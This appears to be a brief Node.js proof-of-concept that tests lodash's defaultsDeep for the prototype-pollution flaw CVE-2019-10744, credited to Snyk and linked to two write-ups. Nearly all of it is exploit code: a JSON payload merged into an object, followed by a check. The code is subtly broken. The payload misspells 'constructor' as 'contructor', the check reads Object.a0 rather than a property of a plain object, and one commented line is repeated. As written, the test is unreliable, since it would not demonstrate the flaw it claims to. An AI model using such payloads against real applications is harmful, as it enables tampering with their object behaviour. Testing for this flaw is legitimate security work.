/*
 * Very good resource explaining things in more detail:
 * https://itnext.io/prototype-pollution-attack-on-nodejs-applications-94a8582373e7
 * 
 * This example is built off the one described down the page:
 * 
 * "CVE-2019–10744"
 * 
 * The full writeup is at:
 * https://snyk.io/blog/snyk-research-team-discovers-severe-prototype-pollution-security-vulnerabilities-affecting-all-versions-of-lodash/
 *
 */
// PoC by Snyk
const mergeFn = require('lodash').defaultsDeep;
const payload = '{"contructor": {"prototype": {"a0": true}}}';

function check(){
    mergeFn({}, JSON.parse(payload));
//    if (({})[`a0`] === true) {
//    if (({})[`a0`] === true) {
    if (Object.a0 === true) {
        console.log(`Vulnerable to Prototype Pollution via ${payload}`);
    }
}

check()